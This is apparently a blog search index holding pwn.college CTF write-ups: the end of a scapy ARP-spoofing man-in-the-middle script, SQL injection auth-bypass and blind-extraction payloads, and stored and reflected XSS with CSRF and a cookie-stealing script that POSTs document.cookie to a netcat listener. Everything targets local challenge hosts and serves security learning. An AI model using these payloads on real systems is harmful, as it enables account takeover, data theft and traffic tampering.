+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, threading, time</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Raw, get_if_hwaddr, sendp, sniff, IP, TCP, Ether</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> arp_mitm, getmacbyip</span><br><span class="line"></span><br><span class="line">IP_CLIENT, IP_SERVER = <span class="string">&quot;10.0.0.2&quot;</span>, <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line">INTERFACE = <span class="string">&quot;eth0&quot;</span></span><br><span class="line"></span><br><span class="line">MAC_CLIENT = getmacbyip(IP_CLIENT)</span><br><span class="line">MAC_SERVER = getmacbyip(IP_SERVER)</span><br><span class="line">MAC_ATTACKER = get_if_hwaddr(INTERFACE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoofer</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        arp_mitm(</span><br><span class="line">            ip1=IP_CLIENT, ip2=IP_SERVER,</span><br><span class="line">            mac1=MAC_CLIENT, mac2=MAC_SERVER,</span><br><span class="line">            broadcast=<span class="literal">True</span>, target_mac=MAC_ATTACKER, iface=INTERFACE,</span><br><span class="line">        )</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_packet</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (pkt.haslayer(IP) <span class="keyword">and</span> pkt.haslayer(TCP)):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    ip_pkt = pkt[IP].copy()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># client -&gt; server: rewrite &quot;echo&quot; to &quot;flag&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ip_pkt.src == IP_CLIENT <span class="keyword">and</span> ip_pkt.dst == IP_SERVER <span class="keyword">and</span> ip_pkt[TCP].dport == <span class="number">31337</span>:</span><br><span class="line">        <span class="keyword">if</span> ip_pkt.haslayer(Raw) <span class="keyword">and</span> ip_pkt[Raw].load == <span class="string">b&quot;echo&quot;</span>:</span><br><span class="line">            ip_pkt[Raw].load = <span class="string">b&quot;flag&quot;</span></span><br><span class="line">            <span class="keyword">del</span> ip_pkt.<span class="built_in">len</span>, ip_pkt.chksum, ip_pkt[TCP].chksum</span><br><span class="line">        sendp(Ether(dst=MAC_SERVER) / ip_pkt, iface=INTERFACE, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># server -&gt; client: forward (and print flag)</span></span><br><span class="line">    <span class="keyword">elif</span> ip_pkt.src == IP_SERVER <span class="keyword">and</span> ip_pkt.dst == IP_CLIENT <span class="keyword">and</span> ip_pkt[TCP].sport == <span class="number">31337</span>:</span><br><span class="line">        <span class="keyword">if</span> ip_pkt.haslayer(Raw):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Server: <span class="subst">&#123;ip_pkt[Raw].load.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        sendp(Ether(dst=MAC_CLIENT) / ip_pkt, iface=INTERFACE, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">threading.Thread(target=arp_spoofer, daemon=<span class="literal">True</span>).start()</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">sniff(<span class="built_in">filter</span>=<span class="string">&quot;tcp port 31337&quot;</span>, prn=process_packet, store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PwnCollege - SQL Injection</title>
+    <url>/ctf/wp/PwnCollege/PwnCollege-sqli/</url>
+    <content><![CDATA[<h2 id="sqli-1---auth-bypass">sqli 1 - auth bypass</h2>
+<p>two approaches: comment out password check, or
+<code>OR 1=1</code>:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L -c /tmp/cookie.txt -b /tmp/cookie.txt \</span><br><span class="line">  -d <span class="string">&quot;uid=admin&#x27; --&quot;</span> -d <span class="string">&quot;pin=1&quot;</span> <span class="string">&quot;http://challenge.localhost:80/logon&quot;</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">curl -L -c /tmp/cookie.txt -b /tmp/cookie.txt \</span><br><span class="line">  -d <span class="string">&quot;uid=admin&quot;</span> -d <span class="string">&quot;pin=1 or 1=1&quot;</span> <span class="string">&quot;http://challenge.localhost:80/logon&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="sqli-2---auth-bypass">sqli 2 - auth bypass</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L -c /tmp/cookie.txt -b /tmp/cookie.txt \</span><br><span class="line">  -d <span class="string">&quot;account-name=admin&quot;</span> -d <span class="string">&quot;pass=1&#x27; or 1=1 --&quot;</span> <span class="string">&quot;http://challenge.localhost:80/portal&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="sqli-3---union-based-extraction">sqli 3 - UNION-based
+extraction</h2>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="keyword">LIKE</span> &quot;&quot;&quot;&quot; <span class="keyword">UNION</span> <span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="comment">--&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;query=&quot; UNION SELECT password FROM users --&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="sqli-4---table-enumeration-union">sqli 4 - table enumeration +
+UNION</h2>
+<p>enumerate table names first, then extract:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find table name</span></span><br><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;query=&quot; UNION SELECT name FROM sqlite_master WHERE type=&quot;table&quot; --&#x27;</span></span><br><span class="line"><span class="comment"># -&gt; users_8141651746</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># extract password from discovered table</span></span><br><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;query=&quot; UNION SELECT password FROM users_8141651746 --&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="sqli-5---blind-sqli">sqli 5 - blind SQLi</h2>
+<p>vulnerable query uses f-string interpolation:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">query = <span class="string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">&#123; password &#125;</span>&#x27;&quot;</span></span><br><span class="line">user = db.execute(query).fetchone()</span><br></pre></td></tr></table></figure>
+<p>admin’s password is the flag. no direct output – need blind
+extraction.</p>
+<p>naive attempt fails because AND has higher precedence than OR:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># password=&#x27; or substr(password,1,1)=&#x27;p&#x27; --</span></span><br><span class="line"><span class="comment"># parses as: (username=&#x27;admin&#x27; AND password=&#x27;&#x27;) OR (substr(...)=&#x27;p&#x27;)</span></span><br><span class="line"><span class="comment"># this matches ANY user when substr is true, not just admin</span></span><br></pre></td></tr></table></figure>
+<p>blind extraction script – check one char at a time,
+<code>OR username='admin' AND substr(...)</code> ensures we only match
+admin:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line">charset = string.printable.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            payload = <span class="string">f&quot;&#x27; OR username=&#x27;admin&#x27; AND substr(password,<span class="subst">&#123;pos&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27; --&quot;</span></span><br><span class="line">            resp = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> resp.status_code != <span class="number">403</span> <span class="keyword">and</span> resp.status_code != <span class="number">500</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot; [+] Current extracted: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot; [+] Extracted: <span class="subst">&#123;blind_sql()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PwnCollege - XSS</title>
+    <url>/ctf/wp/PwnCollege/PwnCollege-xss/</url>
+    <content><![CDATA[<h2 id="stored-xss">stored xss</h2>
+<h3 id="xss-1">xss 1</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://challenge.localhost:80/&quot;</span> -d <span class="string">&quot;content=&lt;input type=&#x27;text&#x27;&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="xss-2">xss 2</h3>
+<p>inject <code>&lt;script&gt;</code> via stored post, then trigger with
+<code>/challenge/victim</code> (headless Firefox).</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://challenge.localhost:80/&quot;</span> -d <span class="string">&#x27;content=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span></span><br><span class="line">/challenge/victim</span><br></pre></td></tr></table></figure>
+<h2 id="reflected-xss">reflected xss</h2>
+<h3 id="xss-3">xss 3</h3>
+<p>msg is reflected directly into the page body:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">The message:</span><br><span class="line">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="xss-4">xss 4</h3>
+<p>msg is reflected inside a <code>&lt;textarea&gt;</code>, break out
+first:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;textarea name=msg&gt;&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Type your message here!&quot;</span>)&#125;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="xss-5---stored-xss-csrf-get-publish">xss 5 - stored XSS + CSRF
+(GET publish)</h2>
+<p>admin’s unpublished draft contains the flag. published posts render
+raw HTML. <code>/publish</code> is <strong>GET</strong>.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br></pre></td></tr></table></figure>
+<p>login as hacker, store XSS that makes admin’s browser call
+<code>/publish</code>, which publishes admin’s flag draft:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="xss-6---stored-xss-csrf-post-publish">xss 6 - stored XSS + CSRF
+(POST publish)</h2>
+<p>same as xss 5, but <code>/publish</code> is now
+<strong>POST</strong>:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [username])</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;, &#123;method: &#x27;POST&#x27;&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="xss-7---cookie-stealing">xss 7 - cookie stealing</h2>
+<p>key differences from xss 5/6:</p>
+<ul>
+<li>auth is cookie-based: <code>auth=username|password</code> (not
+flask.session)</li>
+<li>admin password = <code>flag[-20:]</code> (truncated flag)</li>
+<li>admin is blocked from posting/publishing</li>
+<li>drafts are visible to their own author</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response.set_cookie(<span class="string">&quot;auth&quot;</span>, username + <span class="string">&quot;|&quot;</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin blocked</span></span><br><span class="line"><span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">    flask.abort(<span class="number">400</span>, <span class="string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># drafts visible to author</span></span><br><span class="line"><span class="keyword">elif</span> post[<span class="string">&quot;author&quot;</span>] == username:</span><br><span class="line">    page += <span class="string">&quot;&lt;b&gt;YOUR DRAFT POST:&lt;/b&gt; &quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;&lt;hr&gt;\n&quot;</span></span><br></pre></td></tr></table></figure>
+<p>since admin can’t publish, steal the cookie instead and log in as
+admin to view the draft:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. login as hacker, store XSS that exfiltrates document.cookie</span></span><br><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;http://localhost:1337/&#x27;, &#123;method: &#x27;POST&#x27;, body: document.cookie&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. listen for stolen cookie</span></span><br><span class="line">nc -l -p 1337 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. trigger victim (admin) to visit the page</span></span><br><span class="line">/challenge/victim</span><br><span class="line"><span class="comment"># received: auth=admin|RT.dJDO1YDL4cjM1gzW&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. use stolen cookie to view as admin</span></span><br><span class="line">curl --cookie <span class="string">&quot;auth=admin|RT.dJDO1YDL4cjM1gzW&#125;&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
 </search>
